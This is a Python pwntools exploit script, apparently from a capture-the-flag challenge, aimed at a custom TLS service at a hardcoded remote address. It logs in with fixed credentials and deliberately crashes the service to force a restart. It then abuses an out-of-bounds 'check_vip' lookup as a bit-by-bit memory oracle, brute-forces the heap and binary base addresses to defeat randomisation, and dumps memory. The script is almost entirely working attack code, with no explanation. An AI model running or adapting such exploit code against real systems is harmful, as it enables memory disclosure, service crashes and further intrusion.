# leak.py
from pwn import *

debug = 0


def login() -> remote:
    if debug:
        p = remote('127.0.0.1', 443, ssl=True, level='error')
    else:
        p = remote('111.186.58.249', 36717, ssl=True, level='error')
    data = 'name=rea1user&passwd=re4lp4ssw0rd'
    packet = f'''POST /login HTTP/1.1
Content-Length: {len(data)}

{data}'''.replace('\n', '\r\n')
    p.send(packet)
    p.recvuntil('success')
    return p


def wrap(data):
    return p32(0xdeadbeef) + p16(len(data) + 6, endian='big') + data


def check_vip(p, val, pack_only=False):
    packet = wrap(p16(3) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(0xC)
        return u32(buf[-4:])
    else:
        return packet


def req_vip(p, val, pack_only=False):
    packet = wrap(p16(1) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(4)
        buf = p.recvn(2)
        sz = u16(buf, endian='big')
        buf = p.recvn(sz - 6)

        return u32(buf[2:6])
    else:
        return packet


def ip2long(ip):
    """
    Convert an IP string to long
    """
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]


def leak(p, off, sz=8):
    data = []
    off <<= 3
    packets = b''
    for i in range(0, sz * 8, 8):
        # out = 0
        for j in range(8):
            packets += check_vip(p, base - i - j - 1 - off, pack_only=True)

    p.send(packets)
    for i in range(0, sz * 8, 8):
        out = 0
        for j in range(8):
            buf = p.recvn(0xC)
            r = u32(buf[-4:])
            out <<= 1
            out |= r ^ 1
        data.append(out)
    return bytearray(data)


def kickout(p, val):
    global mkey
    p.send(wrap(p16(4) + p32(val, endian='big') + mkey))
    buf = p.recvn(0xC)
    return u32(buf[-4:])

m = login()
base = ip2long('172.31.0.0')
crash_first = True
if crash_first:
    try:
        check_vip(m, base - 0xffffff)  # force restart
    except:
        m.close()

    m = login()

if debug:
    heap_param = 15
    heap = 0
    cb = 0x5651eaa9f000
else:
    heap_param = 33
    heap = 0
    cb = 0
if not heap:
    # for x in range(0x100):
    data = leak(m, heap_param * 16, 8)
    heap = u64(data[:8], endian='big') + 0xc0 + (heap_param - 15) * 0x10

log.success(f'heap: 0x{heap:x}')

if not cb:
    heap_off = heap & 0xffff
    t = 3
    pro = log.progress('Leaking base...')
    while True:
        try:
            t += 1
            tmp = login()
            pro.status(f'Try {t}...')
            off = heap_off + 0x10000 * t
            off <<= 3
            check_vip(tmp, base - off)
            pro.success(f'Try {t}...success')
            cb = heap - heap_off - 0x10000 * t
            break
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.status(f'Try {t}...Fail')
        finally:
            tmp.close()

    pro = log.progress('Leaking accurate base...')
    heap_off = heap - cb
    t = 0
    while True:
        try:
            tmp = login()
            pro.status(f'Try {t}...')
            off = heap_off + 0x1000 * t
            t += 1
            off <<= 3
            check_vip(tmp, base - off)
            pro.status(f'Try {t}...Fail')
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.success(f'Try {t}...success')
            cb = heap - heap_off - 0x1000 * t
            break
        finally:
            tmp.close()
    cb += 0x2000
    log.success(f'base: 0x{cb:x}')

w = login()
pprint(leak(w, heap - cb - 8))
m.interactive()`
